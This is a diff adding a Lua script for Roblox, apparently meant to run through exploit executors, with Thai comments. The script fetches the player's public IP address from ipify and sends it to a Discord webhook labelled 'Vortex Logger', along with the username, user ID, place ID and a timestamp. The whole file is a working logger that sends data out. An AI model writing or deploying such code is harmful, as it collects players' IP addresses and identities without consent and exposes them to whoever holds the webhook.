@@ -1,0 +1,60 @@
+local HttpService = game:GetService("HttpService")
+local player = game.Players.LocalPlayer
+
+local webhook = "https://discord.com/api/webhooks/xxx/xxx" -- 🔁 เปลี่ยนเป็น webhook ของ Nes
+
+-- รองรับหลาย Exploit
+local request = http and http.request or syn and syn.request or request or http_request
+
+-- ดึง IP ผ่าน ipify
+local ip = "Unknown"
+pcall(function()
+    local res = request({
+        Url = "https://api.ipify.org?format=text",
+        Method = "GET"
+    })
+    if res and res.Body then
+        ip = res.Body
+    end
+end)
+
+-- เตรียมข้อมูล Embed ที่สวยงามที่สุด
+local data = {
+    ["username"] = "🔒 Vortex Logger",
+    ["avatar_url"] = "https://i.imgur.com/1XfE5ZQ.png", -- Icon ของ Webhook
+    ["embeds"] = {{
+        ["title"] = "🚨 **มีการ Inject เข้าสู่ระบบ** 🚨",
+        ["description"] = "รายละเอียดการตรวจจับการ Inject สคริปต์ในเกมของคุณ",
+        ["color"] = 0xFF5733,  -- สีแดงสด (สามารถปรับเปลี่ยนได้)
+        ["fields"] = {
+            {["name"] = "👤 **Username**", ["value"] = player.Name, ["inline"] = true},
+            {["name"] = "🆔 **UserId**", ["value"] = tostring(player.UserId), ["inline"] = true},
+            {["name"] = "🎮 **Place ID**", ["value"] = tostring(game.PlaceId), ["inline"] = true},
+            {["name"] = "🌐 **IP Address**", ["value"] = ip, ["inline"] = false},
+            {["name"] = "🕒 **เวลา**", ["value"] = os.date("%Y-%m-%d %H:%M:%S"), ["inline"] = false}
+        },
+        ["footer"] = {
+            ["text"] = "🕒 รายละเอียดเมื่อ: " .. os.date("%Y-%m-%d %H:%M:%S"),
+            ["icon_url"] = "https://i.imgur.com/9jpPYdC.png"
+        },
+        ["image"] = {
+            ["url"] = "https://i.imgur.com/vhvKZyS.jpg" -- รูปภาพใหญ่ใน Embed
+        }
+    }}
+}
+
+-- ส่งข้อมูลไป Discord
+local success, err = pcall(function()
+    request({
+        Url = webhook,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode(data)
+    })
+end)
+
+if success then
+    print("✅ ส่งข้อมูลไป Discord สำเร็จ")
+else
+    warn("❌ ส่งข้อมูลล้มเหลว: ", err)
+end
